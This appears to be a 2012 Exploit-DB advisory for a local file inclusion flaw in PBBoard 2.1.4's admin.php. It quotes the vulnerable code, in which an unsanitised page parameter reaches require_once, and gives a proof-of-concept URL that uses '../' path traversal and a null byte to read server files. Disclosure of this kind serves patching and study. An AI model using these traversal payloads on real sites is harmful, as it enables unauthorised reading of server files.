# Exploit Title: PBBoard 2.1.4 Local File Inclusion
# Software Link: http://www.pbboard.com/PBBoard_v2.1.4.zip
# Author: n4ss1m
# Date: 25-05-2012
# Tested on: win/linux
# Home : www.Sec4ever.com
################################################################################################
# Exploit-DB note:
# Need to be logged in, at the very least, as
# a standard user to trigger this vulnerability
#
 
# Local File Inclusion ( admin.php )
 
<?php
    define(&#039;IN_PowerBB&#039;,true);
    $page = empty($_GET[&#039;page&#039;]) ? &#039;index&#039; : $_GET[&#039;page&#039;]; # $page ==>
$_GET[&#039;page&#039;]
    $page = str_replace( &#039;note&#039;, &#039;notes&#039;, $page );
    $page = str_replace( &#039;index&#039;, &#039;main&#039;, $page );
    $module = (&#039;modules/admin/&#039;.$page.&#039;.module.php&#039;); # $module ==>
&#039;modules/admin/&#039;.$page.&#039;.module.php&#039;
    if (!file_exists($module))
    {
        ....
    }
    require_once($module); # Ops ! LFI
    //////////
    $class_name = CLASS_NAME;
    $class_name = new $class_name;
    $class_name->run();
?>
 
# Explotion
http://domain.tld/admin.php?page=../../[FILENAME][Nullbyte]
 
# PoC :
http://domain.tld/admin.php?page=../../robots.txt%00



